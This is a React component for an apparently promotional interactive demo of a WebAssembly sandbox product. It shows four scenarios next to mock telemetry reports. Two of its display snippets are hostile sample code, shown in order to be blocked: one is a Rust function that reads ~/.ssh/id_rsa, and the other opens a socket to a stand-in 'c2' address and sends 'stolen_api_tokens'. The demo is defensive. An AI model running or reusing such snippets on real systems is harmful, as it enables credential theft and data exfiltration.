"use client";

import { useState } from "react";

type Scenario = "secret" | "loop" | "network" | "clean";

interface ScenarioData {
  title: string;
  tag: string;
  status: "killed" | "permission_denied" | "success";
  codeLines: Array<{ text: string; type: "comment" | "keyword" | "code" | "highlight" }>;
  report: {
    status: string;
    fuel_used: string;
    peak_memory: string;
    wall_duration: string;
    violation_attempted: string;
    action_taken: string;
  };
}

const SCENARIOS: Record<Scenario, ScenarioData> = {
  secret: {
    title: "Host File Read",
    tag: "Blocked (Preopen Trap)",
    status: "permission_denied",
    codeLines: [
      { text: "// Malicious prompt injection attempting host secret exfiltration", type: "comment" },
      { text: "fn exploit_read_host_keys() -> Result<(), Box<dyn Error>> {", type: "code" },
      { text: "    let target = \"~/.ssh/id_rsa\";", type: "code" },
      { text: "    let host_secret = std::fs::read_to_string(target)?;", type: "highlight" },
      { text: "    println!(\"LEAKED: {}\", host_secret);", type: "code" },
      { text: "    Ok(())", type: "code" },
      { text: "}", type: "code" },
    ],
    report: {
      status: "permission_denied (errno 44: ENOTCAPABLE)",
      fuel_used: "1,420 instructions",
      peak_memory: "64.0 KB",
      wall_duration: "1.08 µs",
      violation_attempted: "WASI path_open outside preopen (\"~/.ssh/id_rsa\")",
      action_taken: "Trapped by cap-std border. Zero bytes read from host. Aborted cleanly.",
    },
  },
  loop: {
    title: "Infinite Loop",
    tag: "Epoch Interrupted",
    status: "killed",
    codeLines: [
      { text: "// Hostile runaway CPU spin-lock generation", type: "comment" },
      { text: "fn runaway_burn_loop() {", type: "code" },
      { text: "    let mut accumulator: u64 = 0;", type: "code" },
      { text: "    loop {", type: "highlight" },
      { text: "        accumulator = accumulator.wrapping_add(1);", type: "code" },
      { text: "    }", type: "highlight" },
      { text: "}", type: "code" },
    ],
    report: {
      status: "fuel_exhausted / epoch_interrupted",
      fuel_used: "10,000,000 instructions (hard cap reached)",
      peak_memory: "64.0 KB",
      wall_duration: "5.00 ms (deadline triggered)",
      violation_attempted: "Instruction budget limit exceeded (out of fuel)",
      action_taken: "Cross-thread epoch callback trapped store. Host thread returned unblocked.",
    },
  },
  network: {
    title: "Socket Exfiltration",
    tag: "Egress Denied",
    status: "permission_denied",
    codeLines: [
      { text: "// Untrusted agent attempting outbound socket beaconing", type: "comment" },
      { text: "fn exfiltrate_credentials() -> Result<(), Box<dyn Error>> {", type: "code" },
      { text: "    let c2 = \"198.51.100.42:443\";", type: "code" },
      { text: "    let mut sock = std::net::TcpStream::connect(c2)?;", type: "highlight" },
      { text: "    sock.write_all(b\"stolen_api_tokens\")?;", type: "code" },
      { text: "    Ok(())", type: "code" },
      { text: "}", type: "code" },
    ],
    report: {
      status: "permission_denied (WASI net error)",
      fuel_used: "2,190 instructions",
      peak_memory: "128.0 KB",
      wall_duration: "1.15 µs",
      violation_attempted: "TcpConnect to 198.51.100.42 without NetGrant",
      action_taken: "Blocked pre-syscall in WASI shim. Zero DNS packets or sockets dispatched.",
    },
  },
  clean: {
    title: "Safe Computation",
    tag: "Completed (Isolated)",
    status: "success",
    codeLines: [
      { text: "// Authorized algorithmic computation with no host side-effects", type: "comment" },
      { text: "fn process_data(vector: &[f64]) -> f64 {", type: "code" },
      { text: "    let variance = vector.iter()", type: "code" },
      { text: "        .map(|&val| (val - 42.0).powi(2))", type: "code" },
      { text: "        .sum::<f64>();", type: "highlight" },
      { text: "    variance", type: "code" },
      { text: "}", type: "code" },
    ],
    report: {
      status: "completed_ok (exit code 0)",
      fuel_used: "412 instructions",
      peak_memory: "64.0 KB",
      wall_duration: "0.98 µs",
      violation_attempted: "None (zero privileged host imports requested)",
      action_taken: "Execution isolated in linear memory. Deterministic return value captured.",
    },
  },
};

export default function HeroSandbox() {
  const [selected, setSelected] = useState<Scenario>("secret");
  const data = SCENARIOS[selected];

  return (
    <div className="sandbox-card" aria-label="Interactive Sandbox Demo">
      {/* Enclave Control Bar */}
      <div className="sandbox-header">
        <div className="sandbox-dots">
          <span className="dot dot-red" aria-hidden="true" />
          <span className="dot dot-amber" aria-hidden="true" />
          <span className="dot dot-green" aria-hidden="true" />
          <span className="sandbox-title">Boxwren Runtime Enclave v0.2.3</span>
        </div>

        <div className="sandbox-tabs" role="tablist" aria-label="Select Attack Scenario">
          {(Object.keys(SCENARIOS) as Scenario[]).map((key) => (
            <button
              key={key}
              role="tab"
              aria-selected={selected === key}
              onClick={() => setSelected(key)}
              className={`sandbox-tab ${selected === key ? "active" : ""}`}
            >
              <span className={`tab-indicator indicator-${SCENARIOS[key].status}`} aria-hidden="true" />
              <span>{SCENARIOS[key].title}</span>
            </button>
          ))}
        </div>
      </div>

      {/* Grid: Code Guest vs Report Host */}
      <div className="sandbox-body">
        {/* Untrusted Guest Input */}
        <div className="sandbox-pane sandbox-guest">
          <div className="pane-header">
            <span className="pane-label">
              <span className="indicator-pulse" aria-hidden="true" />
              Untrusted Guest Payload
            </span>
            <span className="badge badge-neutral">Wasmtime SFI Enclave</span>
          </div>

          <div className="code-viewer" tabIndex={0} role="region" aria-label="Guest Code Editor">
            <pre className="code-block">
              <code>
                {data.codeLines.map((line, idx) => (
                  <div
                    key={idx}
                    className={`code-line ${
                      line.type === "comment"
                        ? "code-comment"
                        : line.type === "highlight"
                        ? "code-highlight"
                        : ""
                    }`}
                  >
                    <span className="line-num" aria-hidden="true">{idx + 1}</span>
                    <span className="line-content">{line.text}</span>
                  </div>
                ))}
              </code>
            </pre>
          </div>

          <div className="pane-footer">
            <span>Capability Policy: <strong className="text-warn">DENY BY DEFAULT</strong></span>
            <span>Fuel Limit: <strong>10,000,000</strong></span>
          </div>
        </div>

        {/* Boxwren Deterministic Report */}
        <div className="sandbox-pane sandbox-report">
          <div className="pane-header">
            <span className="pane-label">
              <span className="indicator-live" aria-hidden="true" />
              Execution Telemetry Report
            </span>
            <span className={`badge badge-${data.status}`}>
              {data.tag}
            </span>
          </div>

          <div className="telemetry-rows">
            <div className="telemetry-row">
              <span className="telemetry-key">Run Status</span>
              <span className="telemetry-val font-semibold text-primary">{data.report.status}</span>
            </div>
            <div className="telemetry-row">
              <span className="telemetry-key">Wall-Clock Latency</span>
              <span className="telemetry-val text-accent font-bold">{data.report.wall_duration}</span>
            </div>
            <div className="telemetry-row">
              <span className="telemetry-key">Fuel Consumed</span>
              <span className="telemetry-val font-mono">{data.report.fuel_used}</span>
            </div>
            <div className="telemetry-row">
              <span className="telemetry-key">Peak Store Memory</span>
              <span className="telemetry-val font-mono">{data.report.peak_memory}</span>
            </div>
            <div className="telemetry-event">
              <span className="telemetry-key">Journal Audit Trapping</span>
              <div className={`journal-entry journal-status-${data.status}`}>
                <p>{data.report.action_taken}</p>
              </div>
            </div>
          </div>

          <div className="pane-footer">
            <span>Schema v1 Serde JSON</span>
            <span className="text-accent font-semibold">Host Memory 100% Guarded</span>
          </div>
        </div>
      </div>
    </div>
  );
}
